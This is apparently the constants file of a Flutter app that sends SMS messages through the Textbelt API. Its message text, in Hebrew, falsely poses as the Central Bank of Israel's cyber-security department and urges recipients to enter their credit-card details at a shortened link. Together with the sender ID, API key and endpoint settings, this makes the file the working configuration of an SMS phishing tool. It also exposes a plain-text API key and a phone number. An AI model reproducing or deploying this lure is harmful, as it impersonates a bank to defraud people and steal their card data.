import 'dart:ui';

import 'package:flutter/material.dart';

class AppConst {
  static const sub1 = 
  
      "שלום \nאנח מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל, אנא מלא את שמות כרטיס האשראי שלך כדי שנדע את בעליו האמיתי\n\n";

      static const sub2="https://shorturl.at/GMST3";
      static const message =sub1+sub2;

  static const senderId = "RLP";
  static const apiKey = "99e49b10b5ded7f2a8c3f4c9bd9babf6be50758eC5ITx7WPYoaip2ELwZe1vaRsO";
  static const baseUrl = "https://textbelt.com";
  static const textEndPoint = "https://textbelt.com/text";
  static const myNum = "+962781617524";
  static const textFieldStyle = TextStyle(
    color: Colors.white,
    fontSize: 18,
    fontWeight: FontWeight.bold,
    letterSpacing: 1,
    wordSpacing: 1,
    height: 1.5,
    // fontFamily: 'Poppins',
    decoration: TextDecoration.none,
    decorationColor: Colors.white,
    decorationStyle: TextDecorationStyle.solid,
    decorationThickness: 1,
  );

  static const labelStyle = TextStyle(
    color: Colors.white,
    fontSize: 18,
    fontWeight: FontWeight.bold,
    letterSpacing: 1,
    wordSpacing: 1,
    height: 1.5,
    fontFamily: 'Poppins',
    decoration: TextDecoration.none,
    decorationColor: Colors.white,
    decorationStyle: TextDecorationStyle.solid,
    decorationThickness: 1,
  );
}
